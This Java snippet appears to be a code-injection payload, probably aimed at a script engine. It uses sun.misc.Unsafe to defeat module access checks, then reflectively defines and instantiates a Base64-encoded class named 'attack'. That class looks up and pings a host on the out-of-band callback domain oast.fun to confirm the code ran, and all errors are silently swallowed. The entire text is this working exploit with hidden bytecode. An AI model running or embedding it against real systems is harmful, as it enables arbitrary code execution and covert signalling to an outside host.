import sun.misc.Unsafe; import java.lang.reflect.Field; import java.lang.reflect.Method; import java.util.Base64; public class UnsafeTest { public static void test() { try { String payload = "yv66vgAAAEIAKgoAAgADBwAEDAAFAAYBABBqYXZhL2xhbmcvT2JqZWN0AQAGPGluaXQ+AQADKClWCAAIAQAqcXduc2x0cHR2Ym9vZHR0cml2aXl1MG9jZ3htcDB6MjI4Lm9hc3QuZnVuCgAKAAsHAAwMAA0ADgEAFGphdmEvbmV0L0luZXRBZGRyZXNzAQAJZ2V0QnlOYW1lAQAqKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9uZXQvSW5ldEFkZHJlc3M7CgAKABAMABEAEgEAC2lzUmVhY2hhYmxlAQAEKEkpWgkAFAAVBwAWDAAXABgBABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07CAAaAQAPUGluZyBzdWNjZXNzZnVsCgAcAB0HAB4MAB8AIAEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWBwAiAQAIUGluZ1Rlc3QBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQAKRXhjZXB0aW9ucwcAJwEAE2phdmEvbGFuZy9FeGNlcHRpb24BAApTb3VyY2VGaWxlAQANUGluZ1Rlc3QuamF2YQAhACEAAgAAAAAAAQABAAUABgACACMAAAA9AAIAAQAAABkqtwABEge4AAkRE4i2AA9XsgATEhm2ABuxAAAAAQAkAAAAEgAEAAAABAAEAAUAEAAGABgABwAlAAAABAABACYAAQAoAAAAAgAp"; Class&lt;?&gt; unSafe=Class.forName("sun.misc.Unsafe"); Field unSafeField=unSafe.getDeclaredField("theUnsafe"); unSafeField.setAccessible(true); Unsafe unSafeClass= (Unsafe) unSafeField.get(null); Module baseModule=Object.class.getModule(); Class&lt;?&gt; currentClass= UnsafeTest.class; long addr=unSafeClass.objectFieldOffset(Class.class.getDeclaredField("module")); unSafeClass.getAndSetObject(currentClass,addr,baseModule); Class&lt;?&gt; byteArrayClass = Class.forName("[B"); Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", String.class, byteArrayClass, int.class, int.class); defineClass.setAccessible(true); Class&lt;?&gt; calc= (Class&lt;?&gt;) defineClass.invoke(ClassLoader.getSystemClassLoader(), "attack", Base64.getDecoder().decode(payload), 0, Base64.getDecoder().decode(payload).length); calc.newInstance(); }catch (Exception e){} } } UnsafeTest.test();